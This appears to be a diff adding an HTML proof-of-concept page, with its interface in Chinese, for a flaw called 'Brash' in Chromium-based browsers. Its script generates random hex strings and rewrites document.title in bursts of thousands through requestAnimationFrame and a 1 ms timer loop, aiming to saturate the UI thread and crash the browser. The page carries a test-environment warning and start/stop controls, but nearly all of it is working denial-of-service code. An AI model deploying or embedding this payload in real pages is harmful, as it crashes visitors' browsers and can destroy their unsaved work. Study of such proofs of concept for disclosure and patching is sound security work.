@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Brash Vulnerability PoC</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .warning {
+            background-color: #fff3cd;
+            border: 2px solid #ffc107;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        .warning h2 {
+            color: #856404;
+            margin-top: 0;
+        }
+        .controls {
+            background-color: white;
+            border-radius: 5px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        button {
+            background-color: #dc3545;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover {
+            background-color: #c82333;
+        }
+        button:disabled {
+            background-color: #6c757d;
+            cursor: not-allowed;
+        }
+        .status {
+            margin-top: 15px;
+            padding: 10px;
+            background-color: #e9ecef;
+            border-radius: 3px;
+            font-family: monospace;
+        }
+        .info {
+            background-color: #d1ecf1;
+            border-left: 4px solid #0c5460;
+            padding: 10px;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning">
+        <h2>⚠️ 警告</h2>
+        <p><strong>此PoC会尝试使Chromium浏览器崩溃！</strong></p>
+        <p>请在测试环境中使用，且确保已保存所有重要工作。此漏洞影响所有基于Chromium的浏览器（Chrome、Edge、Brave、Opera等）。</p>
+        <p>Firefox和Safari不受影响。</p>
+    </div>
+
+    <div class="controls">
+        <h3>Brash漏洞PoC控制面板</h3>
+        <button id="startBtn" onclick="startAttack()">开始攻击</button>
+        <button id="stopBtn" onclick="stopAttack()" disabled>停止攻击</button>
+        
+        <div class="status" id="status">
+            状态: 就绪
+        </div>
+
+        <div class="info">
+            <p><strong>攻击参数：</strong></p>
+            <ul>
+                <li>Hash种子数量: 100个512字符的十六进制字符串</li>
+                <li>突发大小: 8000次更新/突发</li>
+                <li>更新间隔: 1ms</li>
+                <li>预期速率: 约2400万次document.title更新/秒</li>
+            </ul>
+        </div>
+    </div>
+
+    <script>
+        let attackActive = false;
+        let animationFrameId = null;
+        let intervalId = null;
+        let updateCount = 0;
+        let startTime = null;
+
+        // 阶段1: Hash生成/准备阶段 - 生成100个512字符的十六进制字符串
+        function generateHashSeeds() {
+            const seeds = [];
+            for (let i = 0; i < 100; i++) {
+                let hash = '';
+                for (let j = 0; j < 512; j++) {
+                    // 生成随机十六进制字符
+                    hash += Math.floor(Math.random() * 16).toString(16);
+                }
+                seeds.push(hash);
+            }
+            return seeds;
+        }
+
+        // 阶段2: 突发注入阶段 - 执行document.title更新突发
+        function injectBurst(seeds, seedIndex) {
+            const burstSize = 8000;
+            
+            for (let i = 0; i < burstSize; i++) {
+                // 使用requestAnimationFrame来最大化更新频率
+                if (attackActive) {
+                    // 循环使用100个种子
+                    const seed = seeds[(seedIndex + i) % seeds.length];
+                    // 三个连续的document.title更新
+                    document.title = seed.substring(0, 255); // 限制title长度
+                    document.title = seed.substring(100, 355);
+                    document.title = seed.substring(200, 455);
+                    updateCount += 3;
+                }
+            }
+        }
+
+        // 阶段3: UI线程饱和阶段
+        function saturateUIThread(seeds) {
+            let seedIndex = 0;
+            
+            function updateLoop() {
+                if (!attackActive) return;
+                
+                // 使用requestAnimationFrame和setTimeout组合来最大化CPU使用
+                injectBurst(seeds, seedIndex);
+                seedIndex = (seedIndex + 8000) % seeds.length;
+                
+                // 继续循环
+                if (attackActive) {
+                    animationFrameId = requestAnimationFrame(updateLoop);
+                }
+            }
+            
+            // 同时使用多个更新循环来增加压力
+            for (let i = 0; i < 3; i++) {
+                setTimeout(() => {
+                    if (attackActive) {
+                        animationFrameId = requestAnimationFrame(updateLoop);
+                    }
+                }, i * 0.1);
+            }
+            
+            // 额外的定时器循环
+            intervalId = setInterval(() => {
+                if (attackActive) {
+                    injectBurst(seeds, seedIndex);
+                    seedIndex = (seedIndex + 8000) % seeds.length;
+                }
+            }, 1); // 1ms间隔
+        }
+
+        function startAttack() {
+            if (attackActive) return;
+            
+            attackActive = true;
+            startTime = Date.now();
+            updateCount = 0;
+            
+            document.getElementById('startBtn').disabled = true;
+            document.getElementById('stopBtn').disabled = false;
+            
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = '状态: 攻击进行中... (浏览器可能随时崩溃)';
+            
+            // 阶段1: 准备hash种子
+            console.log('阶段1: 生成Hash种子...');
+            const seeds = generateHashSeeds();
+            console.log(`生成了 ${seeds.length} 个hash种子`);
+            
+            // 阶段2和3: 开始突发注入和UI线程饱和
+            console.log('阶段2-3: 开始突发注入和UI线程饱和...');
+            saturateUIThread(seeds);
+            
+            // 更新统计信息
+            const statsInterval = setInterval(() => {
+                if (!attackActive) {
+                    clearInterval(statsInterval);
+                    return;
+                }
+                
+                const elapsed = (Date.now() - startTime) / 1000;
+                const rate = Math.floor(updateCount / elapsed);
+                statusEl.textContent = `状态: 攻击中 | 运行时间: ${elapsed.toFixed(1)}s | 总更新数: ${updateCount.toLocaleString()} | 速率: ${rate.toLocaleString()}/秒`;
+            }, 100);
+        }
+
+        function stopAttack() {
+            attackActive = false;
+            
+            if (animationFrameId !== null) {
+                cancelAnimationFrame(animationFrameId);
+                animationFrameId = null;
+            }
+            
+            if (intervalId !== null) {
+                clearInterval(intervalId);
+                intervalId = null;
+            }
+            
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+            
+            const statusEl = document.getElementById('status');
+            const elapsed = startTime ? (Date.now() - startTime) / 1000 : 0;
+            statusEl.textContent = `状态: 已停止 | 总更新数: ${updateCount.toLocaleString()} | 持续时间: ${elapsed.toFixed(1)}s`;
+            
+            document.title = 'Brash PoC - 已停止';
+        }
+
+        // 页面卸载时清理
+        window.addEventListener('beforeunload', () => {
+            stopAttack();
+        });
+    </script>
+</body>
+</html>
+
